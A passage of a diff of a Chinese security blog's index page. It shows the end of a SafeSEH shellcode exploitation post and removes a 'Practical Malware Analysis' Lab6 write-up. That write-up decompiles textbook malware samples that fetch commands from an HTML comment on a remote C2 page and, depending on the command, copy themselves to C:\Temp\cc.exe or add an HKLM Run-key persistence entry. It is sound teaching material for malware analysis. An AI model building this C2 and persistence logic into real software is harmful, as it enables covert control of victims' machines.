3</span></span><br><span class="line">	test(shellcode);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终结果：</p>
+<p><img src="/2020/04/17/safeSEH/success34.JPG" alt></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/16/ms06-040%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1363,250 +1603,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/16/lab6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ivoripuion">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ivoripuion's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/16/lab6/" itemprop="url">恶意代码分析实战 Lab6</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-04-16T20:22:40+08:00">
-                2020-04-16
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/reverse/" itemprop="url" rel="index">
-                    <span itemprop="name">reverse</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Lab6-1"><a href="#Lab6-1" class="headerlink" title="Lab6-1"></a>Lab6-1</h1><h2 id="Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？"><a href="#Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？" class="headerlink" title="Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？"></a>Q1：在main函数调用的唯一子过程中发现的主要代码结构是什么？</h2><p>主要是对0x401000处的函数返回值进行一个if判断。</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00401040</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401041</span>                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401043</span>                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401044</span>                 <span class="keyword">call</span>    sub_401000</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401049</span>                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0040104C                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401050</span>                 <span class="keyword">jnz</span>     short loc_401056</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401052</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401054</span>                 <span class="keyword">jmp</span>     short loc_40105B</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401056</span> loc_401056:                             <span class="comment">; CODE XREF: _main+10↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401056</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>0040105B</span><br><span class="line"><span class="symbol">.text:</span>0040105B loc_40105B:                             <span class="comment">; CODE XREF: _main+14↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0040105B                 <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040105D</span>                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>0040105E                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>0040105E _main           endp</span><br><span class="line"><span class="symbol">.text:</span>0040105E</span><br></pre></td></tr></table></figure>
-
-<p>[ebp+var_4]存储的是0x401000函数的返回值，eax存储main函数得返回值，这里判断0x401000函数的返回值是否为0，是0则main的函数返回0，不是则返回1。</p>
-<h2 id="Q2：位于0x40105F的子过程是什么？"><a href="#Q2：位于0x40105F的子过程是什么？" class="headerlink" title="Q2：位于0x40105F的子过程是什么？"></a>Q2：位于0x40105F的子过程是什么？</h2><p>0x40105F是printf函数。</p>
-<p>该函数调用方式：sub_40105F(aSuccessInterne, v1);</p>
-<p>aSuccessInterne是一段提示字符串：“Success: Internet Connection”，v1是判断网络是否连接的标识位。</p>
-<p>0x40105F是0x401000中调用的子函数，其伪代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_40105F</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  v2 = _stbuf(&amp;stru_407098);</span><br><span class="line">  v3 = sub_401282(&amp;stru_407098, a1, &amp;a2);</span><br><span class="line">  _ftbuf(v2, &amp;stru_407098);</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>_stbuf用于初始化一片缓冲区，_ftbuf与之类似，是用于线程安全的处理，sub_401282实则为_output函数，用于可变参数列表的处理，这里的分析可以通过stru_407098的内容推测：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span><span class="number">00407098</span> <span class="comment">; FILE stru_407098</span></span><br><span class="line"><span class="symbol">.data:</span><span class="number">00407098</span> stru_407098     FILE &lt;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&gt;</span><br></pre></td></tr></table></figure>
-
-<p>FILE实则为_IO_FILE的结构，FILE &lt;0, 0, 0, 2, 1, 0, 0, 0&gt;指向的是stdout标准输入流，所以可以推测出sub_40105F为printf函数。</p>
-<h2 id="Q3：这个程序的目的是什么？"><a href="#Q3：这个程序的目的是什么？" class="headerlink" title="Q3：这个程序的目的是什么？"></a>Q3：这个程序的目的是什么？</h2><p>检测系统能否连接网络，是则打印”Success: Internet Connection”，不是则打印”Error 1.1: No Internet”。</p>
-<h1 id="Lab6-2"><a href="#Lab6-2" class="headerlink" title="Lab6-2"></a>Lab6-2</h1><h2 id="Q1：main函数调用的第一个子过程执行了什么操作？"><a href="#Q1：main函数调用的第一个子过程执行了什么操作？" class="headerlink" title="Q1：main函数调用的第一个子过程执行了什么操作？"></a>Q1：main函数调用的第一个子过程执行了什么操作？</h2><p>与lab6-1中0x401000函数一样，判断系统是否连接网络，是则返回1，不能则返回0，并打印出网络状态的信息。</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00401000</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401001</span>                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401003</span>                 <span class="keyword">push</span>    <span class="built_in">ecx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401004</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; dwReserved</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401006</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpdwFlags</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401008</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:InternetGetConnectedState</span><br><span class="line"><span class="symbol">.text:</span>0040100E                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401011</span>                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401015</span>                 <span class="keyword">jz</span>      short loc_40102B</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401017</span>                 <span class="keyword">push</span>    offset aSuccessInterne <span class="comment">; "Success: Internet Connection\n"</span></span><br><span class="line"><span class="symbol">.text:</span>0040101C                 <span class="keyword">call</span>    printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401021</span>                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401024</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401029</span>                 <span class="keyword">jmp</span>     short loc_40103A</span><br><span class="line"><span class="symbol">.text:</span>0040102B <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>0040102B</span><br><span class="line"><span class="symbol">.text:</span>0040102B loc_40102B:                             <span class="comment">; CODE XREF: chk_con_401000+15↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0040102B                 <span class="keyword">push</span>    offset aError11NoInter <span class="comment">; "Error 1.1: No Internet\n"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401030</span>                 <span class="keyword">call</span>    printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401035</span>                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401038</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0040103A</span><br><span class="line"><span class="symbol">.text:</span>0040103A loc_40103A:                             <span class="comment">; CODE XREF: chk_con_401000+29↑j</span></span><br><span class="line"><span class="symbol">.text:</span>0040103A                 <span class="keyword">mov</span>     <span class="built_in">esp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>0040103C                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040103D</span>                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040103D</span> chk_con_401000  endp</span><br></pre></td></tr></table></figure>
-
-<h2 id="Q2：位于0x40117F的子过程是什么？"><a href="#Q2：位于0x40117F的子过程是什么？" class="headerlink" title="Q2：位于0x40117F的子过程是什么？"></a>Q2：位于0x40117F的子过程是什么？</h2><p>与Lab6-1中2的函数一样，为printf函数。</p>
-<h2 id="Q3：被main函数调用的第二个子过程做了什么？"><a href="#Q3：被main函数调用的第二个子过程做了什么？" class="headerlink" title="Q3：被main函数调用的第二个子过程做了什么？"></a>Q3：被main函数调用的第二个子过程做了什么？</h2><p>首先call InternetOpenA(szAgent,0,0,0,0)：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00401049</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; dwFlags</span></span><br><span class="line"><span class="symbol">.text:</span>0040104B                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpszProxyBypass</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040104D</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpszProxy</span></span><br><span class="line"><span class="symbol">.text:</span>0040104F                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; dwAccessType</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401051</span>                 <span class="keyword">push</span>    offset szAgent  <span class="comment">; "Internet Explorer 7.5/pma"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401056</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:InternetOpenA</span><br></pre></td></tr></table></figure>
-
-<p>返回值传给[ebp+hInternet]：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0040105C                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+hInternet], <span class="built_in">eax</span></span><br></pre></td></tr></table></figure>
-
-<p>呼叫InternetOpenUrlA(hInternet,szUrl,0,0,0,0)，hInternet=[ebp+hInternet]：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0040105C                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+hInternet], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0040105F                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; dwContext</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401061</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; dwFlags</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401063</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; dwHeadersLength</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401065</span>                 <span class="keyword">push</span>    <span class="number">0</span>               <span class="comment">; lpszHeaders</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401067</span>                 <span class="keyword">push</span>    offset szUrl    <span class="comment">; "http://www.practicalmalwareanalysis.com"...</span></span><br><span class="line"><span class="symbol">.text:</span>0040106C                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+hInternet]</span><br><span class="line"><span class="symbol">.text:</span>0040106F                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; hInternet</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401070</span>                 <span class="keyword">call</span>    <span class="built_in">ds</span>:InternetOpenUrlA</span><br></pre></td></tr></table></figure>
-
-<p>判断InternetOpenUrlA返回值是否为0：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>004010B7                 <span class="keyword">mov</span>     [<span class="built_in">ebp</span>+var_4], <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>004010BA                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+var_4], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>004010BE                 <span class="keyword">jnz</span>     short loc_4010E5</span><br></pre></td></tr></table></figure>
-
-<p>这个if判断语句使用伪代码看比较方便：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( hFile )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = InternetReadFile(hFile, &amp;Buffer, <span class="number">0x200</span>u, &amp;dwNumberOfBytesRead);</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( Buffer != <span class="number">60</span> || v2 != <span class="number">33</span> || v3 != <span class="number">45</span> || v4 != <span class="number">45</span> )<span class="comment">// &lt;!--</span></span><br><span class="line">      &#123;</span><br><span class="line">        printf_40117F(aError23FailToG);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printf_40117F(aError22FailToR);</span><br><span class="line">      InternetCloseHandle(hInternet);</span><br><span class="line">      InternetCloseHandle(hFile);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printf_40117F(aError21FailToO);</span><br><span class="line">    InternetCloseHandle(hInternet);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure>
-
-<p>若能打开 “<a href="http://www.practicalmalwareanalysis.com/cc.htm&quot;" target="_blank" rel="noopener">http://www.practicalmalwareanalysis.com/cc.htm&quot;</a> 这个网页，将返回的html数据包中的0x200长度的数据存在Buffer中，并将Buffer的内容与60,33,45,45这几个ascii的值进行比较，翻译为字符串即是”&lt;””!””-“”-“，为html语句的注释符号，没有注释符就打印错误信息，有则将ebp+var_20C处的局部变量作为返回值返回给上级调用。</p>
-<h2 id="Q4：在这个子过程中使用了什么类型的代码结构？"><a href="#Q4：在这个子过程中使用了什么类型的代码结构？" class="headerlink" title="Q4：在这个子过程中使用了什么类型的代码结构？"></a>Q4：在这个子过程中使用了什么类型的代码结构？</h2><p>该函数调用了InternetReadFile函数，将打开的网站的返回包中的数据存到Buffer中，将Buffer中的注释部分解析出来。</p>
-<h2 id="Q5：在这个程序中有任何基于网络的特征的指示吗？"><a href="#Q5：在这个程序中有任何基于网络的特征的指示吗？" class="headerlink" title="Q5：在这个程序中有任何基于网络的特征的指示吗？"></a>Q5：在这个程序中有任何基于网络的特征的指示吗？</h2><p>前文函数使用的参数的字符串：</p>
-<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span>004070C4 szUrl           <span class="built_in">db</span> <span class="string">'http://www.practicalmalwareanalysis.com/cc.htm'</span>,<span class="number">0</span></span><br><span class="line">.................</span><br><span class="line"><span class="symbol">.data:</span>004070F4 szAgent         <span class="built_in">db</span> <span class="string">'Internet Explorer 7.5/pma'</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
-
-<p>访问一个网址 <a href="http://www.practicalmalwareanalysis.com" target="_blank" rel="noopener">http://www.practicalmalwareanalysis.com</a> ，并使用Internet Explorer 7.5/pma 作为http包中的 User-Agent。</p>
-<h2 id="这个恶意代码的目的是什么？"><a href="#这个恶意代码的目的是什么？" class="headerlink" title="这个恶意代码的目的是什么？"></a>这个恶意代码的目的是什么？</h2><p>整体框架如下：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !chk_con_401000() )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = get_html_401040();</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf_40117F(aSuccessParsedC, v4);</span><br><span class="line">    Sleep(<span class="number">0xEA60</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>首先判断是否可以连接网络，可以则访问 <a href="http://www.practicalmalwareanalysis.com" target="_blank" rel="noopener">http://www.practicalmalwareanalysis.com</a> 这个网站，并将返回包中的注释解析，输出为“Success: Parsed command is %c”的形式，最后休眠60000ms然后关闭程序。</p>
-<h1 id="Lab6-3"><a href="#Lab6-3" class="headerlink" title="Lab6-3"></a>Lab6-3</h1><h2 id="Q1：比较在main函数于实验6-2的mian函数的调用。从main中调用的新的函数是什么？"><a href="#Q1：比较在main函数于实验6-2的mian函数的调用。从main中调用的新的函数是什么？" class="headerlink" title="Q1：比较在main函数于实验6-2的mian函数的调用。从main中调用的新的函数是什么？"></a>Q1：比较在main函数于实验6-2的mian函数的调用。从main中调用的新的函数是什么？</h2><p>位于0x401130的函数是新出现的：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !chk_if_con_401000() )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = get_html_401040();</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf_401271(aSuccessParsedC, v4);</span><br><span class="line">    sub_401130(v4, *argv);</span><br><span class="line">    Sleep(<span class="number">0xEA60</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Q2：这个新的函数使用的参数是什么？"><a href="#Q2：这个新的函数使用的参数是什么？" class="headerlink" title="Q2：这个新的函数使用的参数是什么？"></a>Q2：这个新的函数使用的参数是什么？</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sub_401130(v4, *argv);</span><br></pre></td></tr></table></figure>
-
-<p>一个是v4，为html注释中解析出的字符，一个为argv[0]，是运行程序时传入的第一个参数，即程序的名字。</p>
-<h2 id="Q3：这个函数包含的主要代码结构是什么？"><a href="#Q3：这个函数包含的主要代码结构是什么？" class="headerlink" title="Q3：这个函数包含的主要代码结构是什么？"></a>Q3：这个函数包含的主要代码结构是什么？</h2><p>主要结构是一个HKEY局部变量以及一个switch语句。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">sub_401130</span><span class="params">(<span class="keyword">char</span> a1, LPCSTR lpExistingFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  HKEY phkResult; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">97</span>:</span><br><span class="line">      CreateDirectoryA(PathName, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">98</span>:</span><br><span class="line">      CopyFileA(lpExistingFileName, (LPCSTR)Data, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">99</span>:</span><br><span class="line">      DeleteFileA((LPCSTR)Data);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">100</span>:</span><br><span class="line">      RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, <span class="number">0</span>, <span class="number">0xF003F</span>u, &amp;phkResult);</span><br><span class="line">      <span class="keyword">if</span> ( RegSetValueExA(phkResult, ValueName, <span class="number">0</span>, <span class="number">1u</span>, Data, <span class="number">0xF</span>u) )</span><br><span class="line">        printf_401271(aError31CouldNo);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">101</span>:</span><br><span class="line">      Sleep(<span class="number">0x186A0</span>u);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      printf_401271(aError32NotAVal);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Q4：这个函数能够做什么？"><a href="#Q4：这个函数能够做什么？" class="headerlink" title="Q4：这个函数能够做什么？"></a>Q4：这个函数能够做什么？</h2><ol>
-<li>在路径 C:\Temp中创建一个文件；</li>
-<li>将运行程序时带的第二个参数为名的文件复制为 C:\Temp\cc.exe；</li>
-<li>删除 C:\Temp\cc.exe；</li>
-<li>将HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run中设置C:\Temp\cc.exe；</li>
-<li>休眠100000ms；</li>
-<li>打印一段讯息；</li>
-</ol>
-<p>简单整理如下：</p>
